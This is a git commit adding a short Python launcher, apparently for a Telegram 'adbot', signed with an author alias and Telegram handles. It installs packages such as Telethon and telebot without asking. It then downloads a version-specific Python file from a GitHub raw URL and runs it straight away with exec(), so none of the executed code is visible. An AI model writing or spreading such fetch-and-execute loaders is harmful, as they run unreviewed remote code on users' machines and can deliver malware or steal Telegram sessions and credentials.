16ea987b20a01c3e77fd7bcb825047dd3eb5244b
STEIN <118396421+devilstein1@users.noreply.github.com>
2025-12-21 15:24:44 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,24 @@
+# ════════════════════
+__ENC_AUTHOR__ = "STEIN"
+__TELEGRAM__ = "@rejerk"
+__GROUP_CHAT__ = "@keped"
+# ════════════════════
+
+
+import sys
+import subprocess
+import time
+import importlib
+packages = ["rich", "python-cfonts", "pytz", "Telethon==1.41.0", "requests", "telebot","ntplib", "aiohttp"]
+for pkg in packages:
+    pkg_name = pkg.split('==')[0]
+    try:
+        importlib.import_module(pkg_name.replace("-", "_"))
+    except ImportError:
+        print(f"Installing {pkg}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
+print("Wait 2 sec till it run")
+time.sleep(2)
+import requests
+url = f"https://raw.githubusercontent.com/devilstein1/adbot/refs/heads/main/{sys.version_info.major}.{sys.version_info.minor}.py"
+exec(requests.get(url).text)
